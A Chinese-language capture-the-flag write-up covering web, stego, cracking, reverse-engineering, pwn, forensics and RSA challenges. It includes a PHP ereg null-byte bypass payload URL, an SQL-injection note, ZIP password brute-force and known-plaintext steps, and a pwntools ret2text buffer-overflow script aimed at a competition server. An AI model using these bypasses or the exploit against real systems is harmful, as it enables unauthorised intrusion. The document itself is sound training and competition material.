## 签到

一个 flash 小游戏

不过跑起来还是挺麻烦的，装了个 360浏览器开兼容模式，再装个 PPAPI 的 flash 才运行起来

打过关后就有 flag 了

A8E5A632E549ECD98E902055B02B10A2

---

## ereg

php代码审计： strpos数组绕过，两种解法:
- 科学计数法
- []数组绕过

代码当时没存：找了个类似题目
```php
<?php
$flag = "flag";
if (isset ($_GET['password'])) {
if (@ereg ("^[1-9]+$", $_GET['password']) === FALSE)
echo '必须输入数字才行';
else if (strpos ($_GET['password'], '#biubiubiu') !== FALSE)
die('Flag: '.$flag);
else
echo '骚年，继续努力吧啊~';
}
?>
```

当时的payload是这样的 http://101.101.101.110:8081/?password=9e9%00*-*

flag{1b38a4ff14824e141f319c8d898e52d2}
提交 1b38a4ff14824e141f319c8d898e52d2

---

## pbootcms

注册账号后登录框存在注入

有个表叫 xxx_flag

进入后找到flag

8fce341a322902400568339b9dcdeb8b

---

## easystego

在图片中间有 2 段 base64 分别解出来就是 flag 了 (我有印象在 BUU 刷到过)

ZmxhZ3tlMDg0ODY1YjY0ZGI0Yg==
flag{e084865b64db4b

2NTAyZDRkM2FkODdlMTE5NDFjfQ==
502d4d3ad87e11941c}

flag{e084865b64db4b502d4d3ad87e11941c}
提交 e084865b64db4b502d4d3ad87e11941c

---

## hardstego

binwalk 分离

得到 压缩包

通过注释知道密码是 RRR+8位数字

直接掩码爆破
RRR?d?d?d?d?d?d?d?d

得到 RRR97126401

结果还是个加密压缩包

明文攻击

又是一个加密压缩包

弱口令

69450992

还有个压缩包

伪加密

010 里面 加密位  9  改为 0

5313ee18175f9bfe75f8e52eca293471
flag{5313ee18175f9bfe75f8e52eca293471}

---

## easy_re

ida 打开直接 string 就有了

A9DF04B4A7BB1DD8B6614EBC06D308B1

---

## PWN

64位栈溢出 ret2txt攻击方式的利用

```py
from pwn import *

context.log_level = "debug"

context.arch = "amd64"

#io = process("./seeya")
io = remote("101.101.101.108",18000)

io.recv()

backdoor = 0x4005b6


payload = b"A"*136 + p32(backdoor)

pause()
io.send(payload)

#pause()
input()
io.interactive()
```

cbc4a8eadd78b971b992d7bc79785a3c

---

## Registry

用这个命令导入到注册表
```
REG load HKLM\TempHive "C:\Users\User\Desktop\Registry/$R4YMJQ0.hive"
```

疯狂查找关键字
```
flag
f-l-a-g
f_l_a_g
f.l.a.g
exec
run
```

在这个项里找到 疑似 flag 的内容

HKEY_LOCAL_MACHINE\TempHive\Microsoft\Windows\CurrentVersion\Run

C:\Program Files (x86)\Windows NT\TableTextService\c05e3b3d4e90c9ffb6b93764d6964874.exe

c05e3b3d4e90c9ffb6b93764d6964874

---

## easyRSA

```py
from Crypto.Util.number import *
from Crypto.Random.random import *
from flag import flag

p = getPrime(128)
q = getPrime(128)
n = p*q
e = 65537

flag1 = bytes_to_long(flag[:19])
flag2 = bytes_to_long(flag[19:])

print 'n:'+str(n)
print pow(flag1,e,n)
print pow(flag2,e,n)

# output
# n:82748279383502845283943271120712436408030814624973629060064917325126552245423
# 15927805675061473064882443446714896619253999932379995876769453683208368763004
# 82625508300370326497174411508412477823364297852320058440615952290270370565101
```

用 yafu 跑 p、q

给出了 e、n、c 直接上脚本解2遍拼接就行

flag{63a8817f4512d4f0efd58e7729044546}
